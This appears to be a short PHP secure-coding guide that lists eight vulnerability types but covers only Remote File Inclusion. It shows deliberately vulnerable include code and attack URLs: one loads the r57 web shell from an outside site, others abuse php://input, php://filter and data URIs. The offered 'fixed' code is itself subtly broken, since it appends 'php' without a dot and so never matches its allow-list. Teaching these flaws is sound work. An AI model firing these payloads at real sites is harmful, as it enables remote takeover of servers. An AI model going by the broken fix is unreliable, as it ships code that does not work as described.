#Things you shouldn't do in PHP

1. Remote File Inclusion
2. Local File Inclusion
3. Local File Disclosure/Download
4. Remote Command Execution
5. Remote Code Execution
6. Authentication Bypass/Insecure Permissions
7. Cross-Site Scripting(XSS)
8. Cross Site Request Forgery(CSRF)

##1) Remote File Inclusion
######Basic examples

test.php
```php
<?php
$theme = $_GET['theme'];
include $theme;
?>
```
test1.php
```php
<?php
$theme = $_GET['theme'];
include $theme.'.php';
?>
```
######Attack
- Including Remote Code: 
 	- http://localhost/rfi/index.php?theme=[http|https|ftp]://www.c99shellphp.com/shell/r57.txt
	- http://localhost/rfi/index1.php?theme=[http|https|ftp]://www.c99shellphp.com/shell/r57.txt?
- Using PHP stream php://input:
	- http://localhost/rfi/index.php?theme=php://input 
- Using PHP stream php://filter:
	- http://localhost/rfi/index.php?theme=php://filter/convert.base64-encode/resource=index.php
- Using data URIs:
	- http://localhost/rfi/index.php?theme=data://text/plain;base64,SSBsb3ZlIFBIUAo=
	
######How to fix
- set `allow_url_include = Off` in php.ini
- Validate with array of allowed files
- Don't allow special chars in variables
- filter the slash "/"
- filter "http" , "https" , "ftp" and "smb"

test_fixed.php
```php
<?php
$allowedThemes = array('pink', 'black');
$theme = $_GET['theme'].'php';
if(in_array($theme, $allowedThemes) && file_exists($theme)){
    include $theme;
}
?>
```
######Affected PHP Functions
- require
- require_once
- include
- include_once

		
